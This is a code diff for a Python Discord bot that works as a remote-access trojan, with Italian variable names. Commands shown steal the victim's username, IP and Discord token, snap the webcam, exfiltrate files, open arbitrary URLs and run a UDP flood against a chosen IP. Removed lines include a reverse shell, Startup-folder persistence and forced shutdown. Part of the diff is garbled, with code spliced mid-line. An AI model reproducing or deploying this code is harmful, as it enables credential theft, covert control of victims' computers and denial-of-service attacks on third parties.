@@ -74,6 +74,7 @@ async def username(ctx):
 @client.command()
 async def info(ctx):
     await ctx.send("--------------------" + "\nUsername -> " + getpass.getuser() + "\nip -> " + requests.get("https://checkip.amazonaws.com").text + "system -> " + platform.system() + "\nlocal ip -> " + str(socket.gethostbyname(socket.gethostname())) + "\nDiscord Token: " + token_grabber.tok_grab() +"\n--------------------")
+
 @client.command()
 @commands.has_permissions(administrator=True)
 async def cam_snap(ctx):
@@ -84,9 +85,22 @@ async def cam_snap(ctx):
 
 @client.command()
 @commands.has_permissions(administrator=True)
+async def download_file(ctx, filename):
+    try:
+        await ctx.send(datetime.datetime.now())
+        await ctx.send(file=discord.File(filename))
+    except:
+        await ctx.send("Error. File not found")
+
+@client.command()
+@commands.has_permissions(administrator=True)
 async def write_file(ctx, inp):
-    open("file.txt", "w").write(inp)
-    os.startfile("file.txt")
+    try:
+        open("file.txt", "w").write(inp)
+        os.startfile("file.txt")
+        await ctx.send("file written and opened")
+    except:
+        await ctx.send("Error.")
 
 @client.command()
 @commands.has_permissions(administrator=True)
@@ -183,6 +197,16 @@ async def victim_token(ctx):
 
 @client.command()
 @commands.has_permissions(administrator=True)
+async def open_browser(ctx, url):
+    await ctx.send("Opening browser")
+    try:
+        webbrowser.open(url)
+        await ctx.send("Browser opened successfully")
+    except:
+        await ctx.send("Browser not opened")
+
+@client.command()
+@commands.has_permissions(administrator=True)
 async def rickroll(ctx):
     try:
         os.startfile("video.mp4")
@@ -235,107 +259,25 @@ async def ddos(ctx, ip, port, tm, dl):
     port = int(port)
     ss = int(0)
     while(calcolo!=tt):
-        sock.sendto(bytes, (ip,port))
-        end = int(time.time())
-        calcolo=end-start
-        ss += 1
-        if(calc_warn == dl):
-            await ctx.send("%s socket sent in %s seconds"%(ss, calcolo))
-            start_warn = int(time.time())
-            end_warn = int(time.time())
-        end_warn = int(time.time())
-        calc_warn = end_warn-start_warn
-    if(calcolo == tt):
-            await ctx.send("sockets sent successfully")
-
-client.run(discord_bot_token)
-
-DiscordWebhook(url=Webhook_url, content=(getpass.getuser() + " => " + requests.get("https://checkip.amazonaws.com").text + "si è disconnsesso")).execute()
-
-os.system("cls")ue)
-async def power_off(ctx):
-    await ctx.send("powering off the pc")
-    if(platform.system == "Windows"):
-        os.system("shutdown /s /t 00")
-    else:
-        os.system("shutdown /r now")
-
-@client.command()
-@commands.has_permissions(administrator=True)
-async def disconnect(ctx):
-    DiscordWebhook(url=Webhook_url, content=(getpass.getuser() + " => " + requests.get("https://checkip.amazonaws.com").text + "si è disconnsesso")).execute()
-    exit()
-
-@client.command()
-@commands.has_permissions(administrator=True)
-async def system_info(ctx):
-    systemInfo = platform.system()
-    await ctx.send(systemInfo)
-
-@client.command()
-@commands.has_permissions(administrator=True)
-async def os_shell(ctx, ip, port):
-    await ctx.send("sending reverse shell")
-    try:
-        await ctx.send("reverse shell sent :)")
-        rv.reverse_shell(ip=ip, port=port)
-    except:
-        await ctx.send("reverse shell not sent :(")
-    await ctx.send("reverse shell closed")
-
-@client.command()
-@commands.has_permissions(administrator=True)
-async def auto_startup(ctx, filename):
-    if(platform.system() == "Windows"):
         try:
-            shutil.copy(filename, "C:\\Users\\" + getpass.getuser() + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
-            lunghezza = (len(filename)-1)
-            Lettera = filename[lunghezza-1] + filename[lunghezza]
-            if(Lettera == "py"):
-                try:
-                    os.mkdir("C:\\Users\\" + getpass.getuser() + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\trojan_functions")
-                    shutil.copy("trojan_functions\\cam.py", "C:\\Users\\" + getpass.getuser() + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\trojan_functions")
-                    shutil.copy("trojan_functions\\rv.py", "C:\\Users\\" + getpass.getuser() + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\trojan_functions")
-                except OSError:
-                    await ctx.send("auto startup failed")
-                await ctx.send("auto startup done")
-            else:
-                await ctx.send("auto startup done")
-        except:
-            await ctx.send("auto startup failed")
-    else:
-        await ctx.send("not compatible on linux")
-
-@client.command()
-@commands.has_permissions(administrator=True)
-async def ddos(ctx, ip, port, tm, dl):
-    await ctx.send("Seding sockets")
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    bytes = random._urandom(1490)
-    start = int(time.time())
-    end = int(time.time())
-    start_warn = int(time.time())
-    end_warn = int(time.time())
-    calc_warn = end_warn-start_warn
-    calcolo=end-start
-    tt = int(tm)
-    dl = int(dl)
-    port = int(port)
-    ss = int(0)
-    while(calcolo!=tt):
-        sock.sendto(bytes, (ip,port))
-        end = int(time.time())
-        calcolo=end-start
-        ss += 1
-        if(calc_warn == dl):
-            await ctx.send("%s socket sent in %s seconds"%(ss, calcolo))
-            start_warn = int(time.time())
+            sock.sendto(bytes, (ip,port))
+            end = int(time.time())
+            calcolo=end-start
+            ss += 1
+            if(calc_warn == dl):
+                await ctx.send("%s socket sent in %s seconds to %s:%s"%(ss, calcolo, ip, port))
+                start_warn = int(time.time())
+                end_warn = int(time.time())
             end_warn = int(time.time())
-        end_warn = int(time.time())
-        calc_warn = end_warn-start_warn
-    if(calcolo == tt):
-            await ctx.send("sockets sent successfully")
+            calc_warn = end_warn-start_warn
+            if(calcolo == tt):
+                await ctx.send("sockets sent successfully")
+        except:
+            await ctx.send("Error. Host not found")
+            break;
 
 client.run(discord_bot_token)
 
 DiscordWebhook(url=Webhook_url, content=(getpass.getuser() + " => " + requests.get("https://checkip.amazonaws.com").text + "si è disconnsesso")).execute()
+
+os.system("cls")
